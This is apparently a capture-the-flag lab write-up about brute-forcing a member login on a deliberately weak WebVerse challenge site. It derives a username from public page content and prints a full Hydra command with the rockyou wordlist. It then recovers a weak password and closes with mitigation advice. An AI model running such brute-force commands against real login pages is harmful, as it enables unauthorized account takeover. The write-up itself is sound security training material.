---
title: "Weak Credentials – Authentication Compromise via Password Brute Force | Halftrack Model Railroad Club"
date: 2026-05-18 02:30:00 +0530
categories: [A07 - Authentication Failures, Password Brute Force]
tags: [bruteforce, weak-passwords, authentication, missing-rate-limit, credential-attack, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/halftrack-model-railroad-club.webp
  alt: Halftrack Model Railroad Club WebVerse challenge
---

# Lab Link

https://dashboard.webverselabs-pro.com/challenges/combination

# Overview

The **Halftrack Model Railroad Club** challenge demonstrates an **authentication weakness caused by predictable usernames, weak passwords, and missing rate limiting**.

The application exposed a member login portal that allowed unlimited authentication attempts. Combined with publicly available user information and poor password choices, this enabled successful credential guessing through brute force.

The vulnerability was not caused by SQL injection or authentication bypass logic. The application simply lacked defensive controls against repeated login attempts.

# Objective

Identify a valid username, brute force the password, and gain access to the member portal.

# Vulnerability Classification Hierarchy

```text
OWASP Category
└── A07: Identification and Authentication Failures
    └── Weak Authentication Controls
        └── Password Brute Force
            └── Missing Login Rate Limiting with Weak Credentials
```

# Reconnaissance

The member login portal was available at:

```text
https://b2f791cb-4065-combination-8631a.challenges.webverselabs-pro.com/login
```

A hint on the login page stated:

```text
Username is firstinitial + lastname
(lowercase, no spaces or dots)
```

This disclosed the username generation format.

Additional information gathering was performed on:

```text
https://b2f791cb-4065-combination-8631a.challenges.webverselabs-pro.com/about
```

The page identified the club president:

```text
Hollis Kerrigan
```

Using the provided naming convention:

```text
h + kerrigan
```

Generated username:

```text
hkerrigan
```

# Exploitation

Since the challenge scenario specifically mentioned:

```text
There is no rate limit on the login form
```

password brute forcing became practical.

Hydra command:

```bash
hydra -l hkerrigan \
-P /usr/share/wordlists/rockyou.txt \
b2f791cb-4065-combination-8631a.challenges.webverselabs-pro.com \
https-post-form "/login:username=^USER^&password=^PASS^:Incorrect username or password"
```

Hydra repeatedly attempted passwords from the supplied wordlist.

Successful credentials:

```text
hkerrigan : password1
```

# Proof of Exploitation

Using the recovered credentials:

```text
Username: hkerrigan

Password: password1
```

Access was granted to:

```text
https://b2f791cb-4065-combination-8631a.challenges.webverselabs-pro.com/member/dashboard
```

Dashboard contents exposed:

```text
WEBVERSE{.....}
```

Attack path:

```text
Public Information
        ↓
Username Enumeration
        ↓
Predictable Username Generation
        ↓
Password Brute Force
        ↓
Authentication Success
        ↓
Dashboard Access
```

# Root Cause

The compromise resulted from several issues occurring together:

### Predictable username scheme

```text
firstinitial + lastname
```

### Weak password selection

```text
password1
```

### Missing login protections

No controls existed to detect or slow repeated attempts.

Likely implementation:

```python
if username_exists:
    check_password()
```

without:

```python
limit_attempts()
lock_account()
monitor_behavior()
```

# Impact

In real-world environments these weaknesses can lead to:

- Account takeover
- Unauthorized portal access
- Credential stuffing success
- Administrative compromise
- Sensitive data exposure
- Internal application access

Brute force attacks frequently succeed against users with weak passwords.

# Mitigation

## Enforce strong password requirements

Weak:

```text
password1
welcome123
admin123
```

Stronger examples:

```text
Random long passphrases
```

## Implement rate limiting

Example:

```text
5 failed attempts
        ↓
Temporary lockout
```

## Add account lockouts

Restrict repeated attempts:

```text
Maximum failed attempts
Cooldown period
```

## Implement MFA

Authentication should include:

```text
Password
+
Additional verification factor
```

## Monitor suspicious activity

Alert on:

```text
Repeated failed logins
High request volume
Credential stuffing patterns
```

# Real-World Insight

Password attacks frequently succeed because attackers combine:

- Public information
- Username patterns
- Common passwords
- Password reuse
- Missing rate limiting

Organizations often assume:

```text
Nobody would guess that username
```

or:

```text
Users choose strong passwords
```

Attackers routinely automate these steps and test thousands of combinations within minutes.